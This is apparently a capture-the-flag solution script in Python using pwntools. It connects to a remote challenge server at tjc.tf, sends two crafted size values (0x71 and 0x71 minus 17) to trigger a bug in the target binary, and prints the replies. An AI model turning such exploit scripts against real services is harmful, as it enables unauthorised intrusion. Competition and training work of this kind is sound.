from pwn import *

e = ELF("./bin/out")

#p = e.process()
p = remote("tjc.tf", 31455)

attack_size = 0x71

print(p.recvline().decode())
p.sendline(str(attack_size))
p.sendline(str(attack_size - 17))
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())

print(p.recvline().decode())
